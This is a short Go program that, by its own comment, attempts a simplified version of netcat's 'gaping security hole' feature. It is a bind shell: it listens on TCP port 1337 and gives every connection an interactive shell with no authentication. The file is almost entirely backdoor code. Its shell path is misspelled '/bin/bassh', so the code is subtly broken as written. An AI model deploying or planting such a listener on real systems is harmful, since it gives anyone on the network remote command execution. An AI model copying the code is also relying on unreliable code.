package main 
import (
	"io"
	"log"
	"net"
	"os/exec"
)

/* 
An attempt at creating a simplified version of netcat's "Gaping security hole feature" with an interactive terminal session
*/

func handle(conn net.Conn){
	// cmd := exec.Command("cmd.exe")
	cmd := exec.Command("/bin/bassh", "-i")
	rp, wp := io.Pipe()
	// Set stdin to our connection
	cmd.Stdin = conn
	cmd.Stdout = wp
	go io.Copy(conn, rp)
	cmd.Run()
	conn.Close()
}

func main(){
	listener, err := net.Listen("tcp", ":1337")
	if err != nil {
		log.Fatalln(err)
	}
	
	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Fatalln(err)
		}
		go handle(conn)
	}
}
